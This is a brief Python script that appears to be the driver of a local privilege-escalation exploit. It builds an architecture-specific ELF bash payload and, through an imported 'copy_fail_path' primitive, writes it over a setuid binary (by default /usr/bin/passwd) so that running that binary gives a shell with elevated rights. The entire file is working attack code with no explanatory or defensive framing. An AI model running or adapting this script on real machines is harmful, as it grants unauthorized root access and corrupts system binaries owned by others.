#!/usr/bin/env python3
import os
import sys

from copyfail_primitive import copy_fail_path
from elf_payloads import bash_payload, native_arch, normalize_arch

target = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("DCF_SUIDBIN", "/usr/bin/passwd")
arch = normalize_arch(os.environ.get("DCF_PAYLOAD_ARCH") or native_arch())
data = bash_payload(arch)
copy_fail_path(target, data)
print(f"patched {target} with {arch} bash payload {len(data)} bytes")
